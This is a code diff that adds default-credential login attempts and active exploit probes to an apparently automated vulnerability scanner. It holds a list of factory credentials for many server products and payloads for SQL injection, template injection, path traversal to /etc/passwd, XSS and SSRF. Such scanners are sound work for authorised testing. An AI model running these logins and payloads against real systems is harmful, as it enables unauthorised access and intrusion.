@@ -17,6 +17,7 @@ Design principles (from Fusion v1/v2 experiments):
 """
 
 import argparse
+import base64
 import csv
 import json
 import logging
@@ -361,6 +362,199 @@ def multi_protocol_fingerprint(host, ports, logger=None):
             if logger:
                 logger.debug(f"TCP probe {host}:{port} error: {e}")
     return results
+
+
+# ═══════════════════════════════════════════════════════════════
+# Layer 2.5: Default Credential + Active PoC Probing
+# ═══════════════════════════════════════════════════════════════
+
+DEFAULT_CREDS = {
+    "apache activemq": [("GET", "/admin/", "admin", "admin")],
+    "activemq": [("GET", "/admin/", "admin", "admin")],
+    "tomcat": [("GET", "/manager/html", "tomcat", "tomcat"),
+               ("GET", "/manager/html", "admin", "admin")],
+    "apache tomcat": [("GET", "/manager/html", "tomcat", "tomcat")],
+    "grafana": [("GET", "/api/org", "admin", "admin")],
+    "jenkins": [("GET", "/api/json", "admin", "admin")],
+    "rabbitmq": [("GET", "/api/overview", "guest", "guest")],
+    "nacos": [("POST", "/nacos/v1/auth/login", "nacos", "nacos")],
+    "phpmyadmin": [("GET", "/", "root", "")],
+    "zabbix": [("POST_JSON", "/api_jsonrpc.php", "Admin", "zabbix")],
+    "oracle weblogic server": [("GET", "/console/login/LoginForm.jsp", "weblogic", "welcome1")],
+    "weblogic": [("GET", "/console/login/LoginForm.jsp", "weblogic", "welcome1")],
+    "sonatype nexus repository manager 3": [("GET", "/service/rest/v1/status", "admin", "admin123")],
+    "nexus": [("GET", "/service/rest/v1/status", "admin", "admin123")],
+    "couchdb": [("GET", "/", "admin", "password")],
+    "elasticsearch": [("GET", "/", "", "")],
+    "mongo-express": [("GET", "/", "admin", "pass")],
+    "apache superset": [("GET", "/api/v1/me/", "admin", "admin")],
+    "superset": [("GET", "/api/v1/me/", "admin", "admin")],
+    "airflow": [("GET", "/api/v1/dags", "airflow", "airflow")],
+    "apache airflow": [("GET", "/api/v1/dags", "airflow", "airflow")],
+    "apache solr": [("GET", "/solr/admin/info/system", "", "")],
+    "solr": [("GET", "/solr/admin/info/system", "", "")],
+    "druid": [("GET", "/druid/index.html", "", "")],
+    "apache druid": [("GET", "/druid/index.html", "", "")],
+    "kibana": [("GET", "/api/status", "", "")],
+    "jupyter": [("GET", "/api", "", "")],
+    "minio": [("GET", "/minio/health/live", "", "")],
+    "redis": [("GET", "/", "", "")],
+}
+
+_VERSION_PATTERNS = [
+    re.compile(r'"version"\s*:\s*"([^"]+)"'),
+    re.compile(r'[Vv]ersion[:\s]+([0-9]+\.[0-9]+[.\w-]*)'),
+    re.compile(r'<version>([0-9]+\.[0-9]+[.\w-]*)</version>'),
+    re.compile(r'Server:\s*\S+/([0-9]+\.[0-9]+[.\w-]*)'),
+]
+
+
+def probe_default_credentials(host, product_name, logger):
+    """Test common default credentials for known products.
+
+    Returns {"authenticated": bool, "credentials": "user:pass",
+             "response_snippet": str, "version": str or None}
+    """
+    product_lower = product_name.lower().strip()
+    creds_list = DEFAULT_CREDS.get(product_lower)
+    if not creds_list:
+        return {"authenticated": False, "credentials": "", "response_snippet": "", "version": None}
+
+    for method, path, user, passwd in creds_list:
+        headers = {"Host": host}
+        data = None
+
+        if user:
+            token = base64.b64encode(f"{user}:{passwd}".encode()).decode()
+            headers["Authorization"] = f"Basic {token}"
+
+        if method == "POST":
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+            data = f"username={user}&password={passwd}"
+            resp = http_request(host, path, method="POST", headers=headers, data=data, timeout=8)
+        elif method == "POST_JSON":
+            headers["Content-Type"] = "application/json"
+            if "zabbix" in product_lower:
+                data = json.dumps({"jsonrpc": "2.0", "method": "user.login",
+                                   "params": {"user": user, "password": passwd}, "id": 1})
+            resp = http_request(host, path, method="POST", headers=headers, data=data, timeout=8)
+        else:
+            resp = http_request(host, path, method="GET", headers=headers, timeout=8)
+
+        status = resp.get("status", 0)
+        body = resp.get("body", "")
+        resp_headers = resp.get("headers", "")
+        full_text = resp_headers + "\n" + body
+
+        authenticated = False
+        if status in (200, 302, 301):
+            if status == 200 and len(body) > 50:
+                if "login" not in body.lower()[:200] or "welcome" in body.lower() or "dashboard" in body.lower():
+                    authenticated = True
+            elif status in (302, 301) and "login" not in (resp_headers.lower()):
+                authenticated = True
+            if user == "" and status == 200 and len(body) > 20:
+                authenticated = True
+
+        version = None
+        for pat in _VERSION_PATTERNS:
+            m = pat.search(full_text)
+            if m:
+                version = m.group(1)
+                break
+
+        if authenticated or version:
+            logger.debug(f"[{host}] CRED-PROBE: {product_lower} {path} "
+                         f"auth={authenticated} cred={user}:{passwd} ver={version}")
+            return {
+                "authenticated": authenticated,
+                "credentials": f"{user}:{passwd}" if authenticated else "",
+                "response_snippet": body[:500],
+                "version": version,
+            }
+
+    return {"authenticated": False, "credentials": "", "response_snippet": "", "version": None}
+
+
+ACTIVE_PROBES = {
+    "sqli": [
+        ("/'%20OR%20'1'='1", "GET", None, ["sql", "syntax", "mysql", "error in your", "warning", "ORA-", "pg_"]),
+        ("/search?q=1'+AND+'1'='1", "GET", None, ["sql", "syntax", "error"]),
+    ],
+    "sql injection": [
+        ("/'%20OR%20'1'='1", "GET", None, ["sql", "syntax", "mysql", "error in your", "warning"]),
+    ],
+    "ssti": [
+        ("/{{7*7}}", "GET", None, ["49"]),
+        ("/?name={{7*7}}", "GET", None, ["49"]),
+        ("/?cmd={{7*7}}", "GET", None, ["49"]),
+    ],
+    "file-read": [
+        ("/..%2f..%2f..%2f..%2fetc/passwd", "GET", None, ["root:x:0:0"]),
+        ("/?file=../../../etc/passwd", "GET", None, ["root:x:0:0"]),
+        ("/?path=....//....//etc/passwd", "GET", None, ["root:x:0:0"]),
+    ],
+    "path traversal": [
+        ("/..%2f..%2f..%2f..%2fetc/passwd", "GET", None, ["root:x:0:0"]),
+        ("/?file=../../../etc/passwd", "GET", None, ["root:x:0:0"]),
+    ],
+    "lfi": [
+        ("/?file=../../../etc/passwd", "GET", None, ["root:x:0:0"]),
+        ("/?page=../../../etc/passwd", "GET", None, ["root:x:0:0"]),
+    ],
+    "xss": [
+        ("/?q=<script>alert(1)</script>", "GET", None, ["<script>alert(1)</script>"]),
+        ("/search?q=<img+src=x+onerror=alert(1)>", "GET", None, ["onerror=alert"]),
+    ],
+    "ssrf": [
+        ("/?url=http://127.0.0.1:80/", "GET", None, []),
+        ("/?target=http://127.0.0.1/", "GET", None, []),
+    ],
+}
+
+
+def probe_active_poc(host, product_name, vuln_class, logger):
+    """Send lightweight exploit payloads to detect vulnerability classes.
+
+    Returns {"detected": bool, "vuln_class": str, "evidence": str,
+             "probe_path": str, "probe_response": str}
+    """
+    vc_lower = vuln_class.lower().strip()
+    probes = ACTIVE_PROBES.get(vc_lower, [])
+    if not probes:
+        for key in ACTIVE_PROBES:
+            if key in vc_lower or vc_lower in key:
+                probes = ACTIVE_PROBES[key]
+                break
+    if not probes:
+        return {"detected": False, "vuln_class": vuln_class, "evidence": "",
+                "probe_path": "", "probe_response": ""}
+
+    for path, method, post_data, indicators in probes:
+        if not indicators:
+            continue
+        resp = http_request(host, path, method=method, data=post_data, timeout=8)
+        if resp.get("status", 0) <= 0:
+            continue
+
+        body_lower = resp.get("body", "").lower()
+        headers_lower = resp.get("headers", "").lower()
+        full_lower = headers_lower + "\n" + body_lower
+
+        for indicator in indicators:
+            if indicator.lower() in full_lower:
+                snippet = resp.get("body", "")[:300]
+                logger.debug(f"[{host}] ACTIVE-POC: {vc_lower} hit on {path} indicator={indicator}")
+                return {
+                    "detected": True,
+                    "vuln_class": vuln_class,
+                    "evidence": f"path={path} matched '{indicator}' in response",
+                    "probe_path": path,
+                    "probe_response": snippet,
+                }
+
+    return {"detected": False, "vuln_class": vuln_class, "evidence": "",
+            "probe_path": "", "probe_response": ""}
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -895,6 +1089,14 @@ def process_target(target, nuclei_data, total, use_fallback, logger):
                         )
                         logger.debug(f"[{token}] TCP: {tcp_text}")
 
+                # Default credential probing — extract version + confirm product
+                cred_result = probe_default_credentials(host, product_name, logger)
+                if cred_result.get("authenticated"):
+                    fp["default_creds"] = cred_result
+                if cred_result.get("version") and not fp.get("version"):
+                    fp["version"] = cred_result["version"]
+                    result["version"] = cred_result["version"]
+
                 if len(product_cves) <= 1:
                     # ── Single CVE: probe + verify match_indicators ──
                     chosen_fp = product_cves[0] if product_cves else vm
@@ -902,8 +1104,16 @@ def process_target(target, nuclei_data, total, use_fallback, logger):
                     cve_id = cve_list[0] if isinstance(cve_list, list) and cve_list else str(cve_list)
                     pr = probe_cve_detection(host, chosen_fp)
                     verified = bool(pr.get("matched_indicators"))
-                    # PoC 守门: 指纹匹配分数高(≥5) 或 match_indicators 命中 → 报漏洞
                     fp_score = vm.get("score", 0)
+                    vuln_class = chosen_fp.get("vuln_class") or vm.get("vuln_class", "")
+
+                    # Active PoC probe if not yet verified
+                    active_poc = None
+                    if not verified and vuln_class:
+                        active_poc = probe_active_poc(host, product_name, vuln_class, logger)
+                        if active_poc.get("detected"):
+                            verified = True
+
                     has_vuln = verified or fp_score >= 8
                     verify = {
                         "verified": verified,
@@ -912,7 +1122,11 @@ def process_target(target, nuclei_data, total, use_fallback, logger):
                         "status_code": pr.get("status", 0),
                         "matched_indicators": pr.get("matched_indicators", []),
                     }
-                    vuln_class = chosen_fp.get("vuln_class") or vm.get("vuln_class", "")
+                    if active_poc and active_poc.get("detected"):
+                        verify["evidence_request"] = f"curl -s -i http://{host}{active_poc['probe_path']}"
+                        verify["evidence_response"] = active_poc.get("probe_response", "")[:2000]
+                        verify["matched_indicators"] = [active_poc.get("evidence", "")]
+
                     vuln_type = VULN_TYPE_MAP.get(vuln_class, "安全漏洞")
                     match_indicators = (chosen_fp.get("detection") or {}).get("match_indicators") or []
                     vuln_name_str = (vm.get("app", "") + " " + vuln_class).strip()
@@ -934,7 +1148,8 @@ def process_target(target, nuclei_data, total, use_fallback, logger):
                     result["elapsed_sec"] = round(time.monotonic() - t0, 2)
                     sym = "✓" if has_vuln else "✗"
                     logger.info(f"[{idx}/{total}] [{token}] VULHUB_FP {sym} {vm.get('app','')} "
-                                f"{cve_id} [{vm.get('severity','')}] verify={result['verify_status']}")
+                                f"{cve_id} [{vm.get('severity','')}] verify={result['verify_status']}"
+                                f"{' (active-poc)' if active_poc and active_poc.get('detected') else ''}")
                     return result
 
                 else:
@@ -988,6 +1203,14 @@ def process_target(target, nuclei_data, total, use_fallback, logger):
                     vuln_type = VULN_TYPE_MAP.get(vuln_class, "安全漏洞")
                     verified = bool(pr.get("matched_indicators"))
                     fp_score = vm.get("score", 0)
+
+                    # Active PoC probe if not yet verified
+                    active_poc = None
+                    if not verified and best_probe_score < 4 and vuln_class:
+                        active_poc = probe_active_poc(host, product_name, vuln_class, logger)
+                        if active_poc.get("detected"):
+                            verified = True
+
                     has_vuln = verified or best_probe_score >= 4 or fp_score >= 8
                     verify = {
                         "verified": verified,
@@ -996,6 +1219,11 @@ def process_target(target, nuclei_data, total, use_fallback, logger):
                         "status_code": pr.get("status", 0),
                         "matched_indicators": pr.get("matched_indicators", []),
                     }
+                    if active_poc and active_poc.get("detected"):
+                        verify["evidence_request"] = f"curl -s -i http://{host}{active_poc['probe_path']}"
+                        verify["evidence_response"] = active_poc.get("probe_response", "")[:2000]
+                        verify["matched_indicators"] = [active_poc.get("evidence", "")]
+
                     match_indicators = (chosen_fp.get("detection") or {}).get("match_indicators") or []
                     vuln_name_str = (vm.get("app", "") + " " + vuln_class).strip()
 
@@ -1016,7 +1244,8 @@ def process_target(target, nuclei_data, total, use_fallback, logger):
                     result["elapsed_sec"] = round(time.monotonic() - t0, 2)
                     sym = "✓" if has_vuln else "✗"
                     logger.info(f"[{idx}/{total}] [{token}] VULHUB_FP+KAG {sym} {vm.get('app','')} "
-                                f"{cve_id} [{chosen_fp.get('severity','')}] verify={result['verify_status']}")
+                                f"{cve_id} [{chosen_fp.get('severity','')}] verify={result['verify_status']}"
+                                f"{' (active-poc)' if active_poc and active_poc.get('detected') else ''}")
                     return result
         else:
             fp = surface_fingerprint(host, logger, token)
